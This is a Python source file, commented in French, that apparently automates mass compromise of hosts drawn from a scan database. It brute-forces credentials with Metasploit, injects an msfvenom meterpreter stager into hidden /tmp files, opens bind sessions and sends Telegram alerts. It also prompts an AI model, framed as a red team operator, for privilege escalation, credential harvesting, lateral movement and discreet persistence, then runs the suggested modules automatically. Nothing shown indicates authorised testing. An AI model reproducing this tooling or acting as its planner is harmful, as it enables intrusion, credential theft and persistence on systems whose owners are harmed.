def pick_next_host():
    """
    Sélectionne la prochaine cible selon SCAN_MODE et READ_MODE.

    SCAN_MODE=normal  → exclut uniquement les 'pwned' (retente tried/error)
    SCAN_MODE=debug   → exclut les hôtes déjà traités sans erreur (strict)

    READ_MODE=random      → TABLESAMPLE SYSTEM(0.5) sur hosts (normal) ou
                            ORDER BY RANDOM() sur host_debug (debug, table petite)
    READ_MODE=sequential  → ORDER BY id OFFSET curseur global;
                            retourne None + reset quand liste épuisée.

    Retourne (host_id, address, scan_details) ou None.
    """
    global _seq_cursor, _seq_total

    try:
        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD,
                              host=PG_HOST, port=PG_PORT) as conn:
            with conn.cursor() as cur:

                # ── Mode DEBUG : lecture depuis host_debug ─────────────────
                if SCAN_MODE == "debug":
                    table = "host_debug"
                    count_q = f"SELECT COUNT(*) FROM {table}"
                    if READ_MODE == "sequential":
                        if _seq_total is None:
                            cur.execute(count_q)
                            _seq_total = cur.fetchone()[0]
                            print(f"[SEQ/DEBUG] {_seq_total} hôtes dans host_debug")
                        if _seq_total == 0 or _seq_cursor >= _seq_total:
                            print(f"[SEQ/DEBUG] Fin de liste ({_seq_cursor}/{_seq_total}) → reset")
                            _seq_cursor = 0
                            _seq_total  = None
                            return None
                        cur.execute(
                            f"SELECT id, address FROM {table} ORDER BY id LIMIT 1 OFFSET {_seq_cursor}"
                        )
                        _seq_cursor += 1
                    else:
                        # host_debug est une petite table → ORDER BY RANDOM() OK
                        cur.execute(f"SELECT id, address FROM {table} ORDER BY RANDOM() LIMIT 1")

                    row = cur.fetchone()
                    if not row:
                        return None
                    hid, addr = row
                    # Récupérer scan_details depuis hosts si l'adresse y existe
                    cur.execute(
                        "SELECT scan_details FROM hosts WHERE host(address::inet) = %s LIMIT 1",
                        (str(addr),)
                    )
                    sd_row = cur.fetchone()
                    scan_details_raw = sd_row[0] if sd_row else None
                    return (hid, addr, scan_details_raw)

                # ── Mode NORMAL : lecture depuis hosts ─────────────────────
                else:
                    base_where = (
                        "scan_status = 'bm12_v3' "
                        "AND scan_details IS NOT NULL "
                        "AND (scan_details::jsonb) ? 'products' "
                        "AND host(address::inet) NOT LIKE 'fe80:%%' "
                        "AND id NOT IN "
                        "  (SELECT host_id FROM uzi_scan_log WHERE status = 'pwned')"
                    )
                    if READ_MODE == "sequential":
                        if _seq_total is None:
                            cur.execute(f"SELECT COUNT(*) FROM hosts WHERE {base_where}")
                            _seq_total = cur.fetchone()[0]
                            print(f"[SEQ/NORMAL] {_seq_total} hôtes disponibles")
                        if _seq_total == 0 or _seq_cursor >= _seq_total:
                            print(f"[SEQ/NORMAL] Fin de liste ({_seq_cursor}/{_seq_total}) → reset")
                            _seq_cursor = 0
                            _seq_total  = None
                            return None
                        cur.execute(
                            f"SELECT id, address, scan_details FROM hosts "
                            f"WHERE {base_where} ORDER BY id LIMIT 1 OFFSET {_seq_cursor}"
                        )
                        _seq_cursor += 1
                    else:
                        cur.execute(
                            f"SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
                            f"WHERE {base_where} LIMIT 1"
                        )
                    return cur.fetchone()

    except psycopg2.Error as e:
        print(f"[ERREUR] pick_next_host: {e}")
        return None



def kill_process_by_name(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
#        print(f"[INFO] Processus {proc.info['name']} (PID: {proc.info['pid']}) ...")
        if process_name in proc.info['name']:
            try:
                proc2kill = psutil.Process(proc.info['pid'])
                proc2kill.terminate()
                proc2kill.wait(timeout=3)
                print(f"[INFO] Processus {process_name} (PID: {proc.info['pid']}) terminé.")
            except psutil.NoSuchProcess:
                print(f"[ERREUR] Processus {process_name} n'existe plus.")
            except psutil.AccessDenied:
                print(f"[ERREUR] Accès refusé pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            except psutil.TimeoutExpired:
                print(f"[ERREUR] Temps d'attente expiré pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            return



def check_target(console, fullname, rhosts, rport):
    """Lance MSF check sur la cible. Retourne False si explicitement non vulnérable."""
    try:
        console.read()  # vider buffer
        cmds = f"use {fullname}\nset RHOSTS {rhosts}\n"
        if rport:
            cmds += f"set RPORT {rport}\n"
        cmds += "check\n"
        console.write(cmds)
        for _ in range(15):
            time.sleep(1)
            if not console.is_busy():
                break
        data = console.read()['data'].lower()
        if any(s in data for s in ['not exploitable', 'not vulnerable', 'safe', 'does not appear', 'cannot exploit']):
            return False
        return True
    except Exception:
        return True  # en cas d'erreur, procéder quand même


def run_brute_force_service(client, host, port, cfg_name, cfg, upgraded_sessions, stats):
    """
    Lance un module auxiliary MSF de brute-force sur un service/port détecté.
    Gère USER_FILE, PASS_FILE, THREADS, options extras et reporting Faraday.
    Retourne True si au moins une session a été ouverte.
    """
    userpass_file = cfg.get('userpass_file')
    user_file     = cfg.get('user_file')
    pass_file     = cfg.get('pass_file')
    module        = cfg['module']
    timeout       = cfg.get('timeout', 300)
    threads       = cfg.get('threads', 4)
    extra         = cfg.get('extra', {})

    # USERPASS_FILE prioritaire si le fichier existe (format user:pass)
    use_userpass = userpass_file and os.path.exists(userpass_file)

    if not use_userpass:
        if user_file and not os.path.exists(user_file):
            print(f"[BRUTE:{cfg_name}] USER_FILE introuvable: {user_file} — skip")
            return False
        if pass_file and not os.path.exists(pass_file):
            print(f"[BRUTE:{cfg_name}] PASS_FILE introuvable: {pass_file} — skip")
            return False
        if not user_file and not pass_file:
            print(f"[BRUTE:{cfg_name}] Aucune wordlist configurée — skip")
            return False

    wl_info = (f" | USERPASS={userpass_file}" if use_userpass
               else (f" | USER={user_file}" if user_file else "")
                    + (f" | PASS={pass_file}" if pass_file else ""))
    print(f"[BRUTE:{cfg_name.upper()}] {host}:{port} | module={module}{wl_info}")

    console_brute = client.consoles.console()
    try:
        try:
            addr = ipaddress.ip_address(str(host).split("/")[0])
            rhosts_val = f"[{host}]" if addr.version == 6 else str(host)
        except ValueError:
            rhosts_val = str(host)

        aux = client.modules.use('auxiliary', module)
        aux['RHOSTS']  = rhosts_val
        aux['RPORT']   = port
        aux['THREADS'] = threads
        if use_userpass:
            aux['USERPASS_FILE'] = userpass_file
        else:
            if user_file:
                aux['USER_FILE'] = user_file
            if pass_file:
                aux['PASS_FILE'] = pass_file
        for opt, val in extra.items():
            try:
                aux[opt] = val
            except Exception:
                pass

        sessions_before = set(client.sessions.list.keys())
        output = console_brute.run_module_with_output(aux, timeout=timeout)
        short = (output or '').strip().replace('\n', ' ')[:200]
        print(f"[BRUTE:{cfg_name.upper()}] {short}")

        # Détecter credentials trouvés dans l'output MSF (lignes [+])
        cred_lines = [l for l in (output or '').splitlines() if '[+]' in l]
        if cred_lines:
            print(f"[BRUTE:{cfg_name.upper()}] {len(cred_lines)} credential(s) trouvé(s):")
            for line in cred_lines[:5]:
                print(f"  {line.strip()}")
            if dojo_report_pwn(str(host), f'auxiliary/{module}',
                               f'credential bruteforce port {port}'):
                stats['faraday_ok'] = True

        # Vérifier nouvelles sessions (SSH, FTP, Telnet, SMB, VNC peuvent en ouvrir)
        sessions_now = client.sessions.list
        new_sessions = set(sessions_now.keys()) - sessions_before
        if new_sessions:
            handle_new_sessions(client, sessions_now, upgraded_sessions, host)
            stats['pwned'].append((f'auxiliary/{module}', f'port:{port}'))
            print(f"[BRUTE:{cfg_name.upper()}] Sessions ouvertes: {sorted(new_sessions)}")
            report_vuln(str(host), f'auxiliary/{module}',
                        f'bruteforce port {port}', sorted(new_sessions)[0])
            return True

    except Exception as e:
        print(f"[BRUTE:{cfg_name.upper()}] Erreur port {port}: {e}")
    finally:
        try:
            console_brute.destroy()
        except Exception:
            pass

    return False


def run_bruteforce_phase(client, host, services, attack_surface_vulns, upgraded_sessions, stats):
    """
    Phase 0 : brute-force credentials sur tous les services détectés.
    Lance le module MSF approprié pour chaque service/port dans BRUTE_MODULES.
    Un module donné n'est lancé qu'une seule fois même si plusieurs ports matchent.
    """
    attempted_modules = set()

    # SSH en premier : si port 22/2222 ouvert, tester les credentials avant tout le reste
    ssh_first = sorted(services, key=lambda s: (0 if s[0] in {22, 2222} else 1, s[0]))

    for port, svc_name, *_ in ssh_first:
        svc = (svc_name or '').lower()

        for cfg_name, cfg in BRUTE_MODULES.items():
            port_match = port in cfg['ports']
            svc_match  = svc in cfg['services'] or any(
                s in svc for s in cfg['services'] if len(s) >= 4
            )
            if not port_match and not svc_match:
                continue

            # Condition attack_surface (ex: tomcat_manager requis pour tomcat)
            required_vuln = cfg.get('attack_surface_key')
            if required_vuln and required_vuln not in attack_surface_vulns:
                continue

            # Ne pas relancer le même module sur un autre port
            if cfg['module'] in attempted_modules:
                continue
            attempted_modules.add(cfg['module'])

            run_brute_force_service(client, host, port, cfg_name, cfg,
                                    upgraded_sessions, stats)


def upgrade_to_meterpreter(client, sid, host, bind_port=None):
    """
    Upgrade une shell session en meterpreter via bind_tcp.
    Pas de LHOST requis — le container se connecte AU target (bind, pas reverse).
    """
    if bind_port is None:
        bind_port = BIND_PORT

    print(f"\n[UPGRADE] Session {sid} ({host}) → meterpreter (bind_tcp:{bind_port})...")

    c = client.consoles.console()
    c.read()

    def shell_cmd(cmd):
        c.write(f'sessions -c "{cmd}" -i {sid}\n')
        for _ in range(6):
            time.sleep(1.5)
            out = c.read()['data']
            if not c.is_busy():
                return out
        return c.read()['data']

    # 1. Détecter l'architecture
    arch = 'x86'
    out = shell_cmd('uname -m')
    if 'x86_64' in out or 'amd64' in out:
        arch = 'x64'
    elif 'aarch64' in out or 'arm64' in out:
        arch = 'aarch64'
    elif 'arm' in out:
        arch = 'armle'
    elif 'mips' in out:
        arch = 'mipsle'
    print(f"[UPGRADE] Arch détectée: {arch}")

    payload = f'linux/{arch}/meterpreter/bind_tcp'
    elf_path = f'/tmp/.uzi_{sid}'

    # 2. Générer le stager avec msfvenom
    result = subprocess.run(
        ['/opt/metasploit/msfvenom', '-p', payload,
         f'LPORT={bind_port}', '-f', 'elf', '-o', elf_path],
        capture_output=True
    )
    if not os.path.exists(elf_path):
        print(f"[UPGRADE] msfvenom échoué: {result.stderr.decode()[:200]}")
        return None

    # 3. Injecter via la session shell (base64 → décode → exécute)
    with open(elf_path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()
    os.unlink(elf_path)

    remote_b64 = f'/tmp/.p{sid}'
    remote_elf = f'/tmp/.m{sid}'

    # Nettoyer tout stager précédent sur ce port (évite "address already in use")
    shell_cmd(f'fuser -k {bind_port}/tcp 2>/dev/null; pkill -9 -f {remote_elf} 2>/dev/null; rm -f {remote_b64} {remote_elf}; true')
    time.sleep(1)

    shell_cmd(f'printf "{b64}" > {remote_b64}')
    shell_cmd(f'base64 -d {remote_b64} > {remote_elf} && chmod +x {remote_elf} && {remote_elf} &')
    time.sleep(3)

    # 4. Démarrer le handler bind_tcp (se connecte AU target)
    known = set(client.sessions.list.keys())
    h = client.consoles.console()
    h.read()
    for cmd in [
        'use exploit/multi/handler',
        f'set PAYLOAD {payload}',
        f'set LPORT {bind_port}',
        f'set RHOST {host}',
        'set ExitOnSession false',
        'run -j',
    ]:
        h.write(cmd + '\n')
        time.sleep(0.5)

    # 5. Attendre la session meterpreter
    for _ in range(20):
        time.sleep(2)
        h.read()
        new = {k: v for k, v in client.sessions.list.items()
               if k not in known and v.get('type') == 'meterpreter'}
        if new:
            msid = list(new.keys())[0]
            info = new[msid]
            print(f"[UPGRADE] Meterpreter session {msid} — "
                  f"{info.get('platform')}/{info.get('arch')} as {info.get('username')}")
            enriched = dict(info)
            try:
                msf_session = client.sessions.session(msid)
                enriched['_sysinfo'] = (msf_session.run_with_output('sysinfo', timeout=10) or '').strip()
                enriched['_getuid'] = (msf_session.run_with_output('getuid', timeout=10) or '').strip()
                enriched['_getpid'] = (msf_session.run_with_output('getpid', timeout=10) or '').strip()
            except Exception as e:
                print(f"[UPGRADE] Enrichissement session échoué: {e}")
            report_note(host, enriched)
            dojo_report_pwn(str(host), enriched.get('via_exploit', '?'),
                               enriched.get('via_payload', '?'), enriched)
            send_telegram_alert({msid: enriched}, host)
            return msid

    print("[UPGRADE] Timeout — upgrade échoué")
    return None


def handle_new_sessions(client, sessions, upgraded_sessions, host):
    """Upgrade les nouvelles shell sessions, alerte Telegram uniquement sur nouvelles sessions."""
    new_shells = {k: v for k, v in sessions.items()
                  if k not in upgraded_sessions and v.get('type') == 'shell'}
    for sid, info in new_shells.items():
        upgraded_sessions.add(sid)
        msid = upgrade_to_meterpreter(client, sid, info.get('session_host', str(host)))
        if msid:
            upgraded_sessions.add(msid)

    current = client.sessions.list
    if current:
        print(f"[SESSION] {len(current)} session(s) actives: {list(current.keys())}")
    if new_shells:
        send_telegram_alert(new_shells, str(host))


def ai_post_exploitation_plan(session_info: dict, services: list, scan_details: dict) -> list:
    """
    Demande à Claude Haiku un plan d'action MITRE ATT&CK après obtention d'une session.
    Retourne jusqu'à 5 actions triées par priorité.
    """
    if not _anthropic_sdk:
        return []
    api_key = os.getenv("ANTHROPIC_API_KEY") or read_secret("anthropic_api_key")
    if not api_key:
        return []

    context = {
        "sysinfo":  session_info.get("_sysinfo", "")[:400],
        "uid":      session_info.get("_getuid", ""),
        "platform": session_info.get("platform", ""),
        "arch":     session_info.get("arch", ""),
        "services": [(p, s) for p, s, *_ in services[:15]],
        "products": [
            p.get("name", p) if isinstance(p, dict) else str(p)
            for p in scan_details.get("products", [])[:10]
        ],
        "os":       scan_details.get("os", ""),
        "type":     scan_details.get("type", ""),
    }
    try:
        client_ai = _anthropic_sdk.Anthropic(api_key=api_key)
        resp = client_ai.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=600,
            messages=[{
                "role": "user",
                "content": (
                    "You are a red team operator. A Metasploit session is open on the host below.\n"
                    "Suggest the next 5 post-exploitation steps using MITRE ATT&CK tactics.\n"
                    "Prioritize: privilege escalation, credential harvesting, lateral movement, "
                    "discreet persistence (files in /tmp with innocuous names), data collection.\n"
                    f"Context:\n{json.dumps(context, indent=2)}\n\n"
                    "Return a JSON array only (no markdown):\n"
                    '[{"tactic":"TAxxxx","technique":"Txxxx","name":"short name",'
                    '"msf_module":"post/xxx/yyy","priority":1}]\n'
                    "Use real Metasploit post/ or auxiliary/ module names. "
                    "Leave msf_module empty if no MSF module exists."
                ),
            }],
        )
        raw = resp.content[0].text.strip()
        start, end = raw.find('['), raw.rfind(']') + 1
        actions = json.loads(raw[start:end] if start >= 0 and end > start else raw)
        print(f"[AI-POST] {len(actions)} tactiques: {[a.get('name','?') for a in actions]}")
        return actions[:5]
    except Exception as e:
        print(f"[AI-POST] Erreur: {e}")
        return []


def run_post_exploitation(client, session_id, host: str,
                          session_info: dict, services: list, scan_details: dict):
    """
    Post-exploitation guidée par LLM après obtention d'une session active.
    1. État des lieux (sysinfo/getuid si pas encore collectés)
    2. Appel LLM pour plan d'action MITRE ATT&CK
    3. Exécution séquentielle des modules MSF recommandés
    """
    print(f"\n[POST-EXP] ── Session {session_id} sur {host} ──")

    # Enrichir session_info si le sysinfo n'a pas encore été collecté
    if not session_info.get("_sysinfo"):
        try:
            sess = client.sessions.session(session_id)
            session_info["_sysinfo"] = (sess.run_with_output("sysinfo", timeout=10) or "").strip()
            session_info["_getuid"]  = (sess.run_with_output("getuid",  timeout=10) or "").strip()
            session_info["_getpid"]  = (sess.run_with_output("getpid",  timeout=10) or "").strip()
            print(f"[POST-EXP] {session_info['_sysinfo'][:120]}")
            print(f"[POST-EXP] UID: {session_info['_getuid']}")
        except Exception as e:
            print(f"[POST-EXP] Enrichissement échoué: {e}")

    actions = ai_post_exploitation_plan(session_info, services, scan_details)
    if not actions:
        print("[POST-EXP] Pas de recommandations LLM — skip")
        return

    console_post = client.consoles.console()
    try:
        for action in actions:
            tactic = action.get("tactic", "?")
            tech   = action.get("technique", "?")
            name   = action.get("name", "?")
            module = (action.get("msf_module") or "").strip()
            suffix = f" ({module})" if module else ""
            print(f"[POST-EXP] {tactic} {tech} — {name}{suffix}")

            if not module or '/' not in module:
                continue

            parts    = module.split('/')
            mod_type = parts[0]          # post | auxiliary | exploit
            mod_name = '/'.join(parts[1:])
            try:
                m = client.modules.use(mod_type, mod_name)
                try:
                    m['SESSION'] = session_id
                except Exception:
                    pass
                output = console_post.run_module_with_output(m, timeout=60)
                short  = (output or '').strip().replace('\n', ' ')[:250]
                print(f"  → {short}")
            except Exception as e:
                print(f"  → Erreur {module}: {e}")
    finally:
        try:
            console_post.destroy()
        except Exception:
            pass


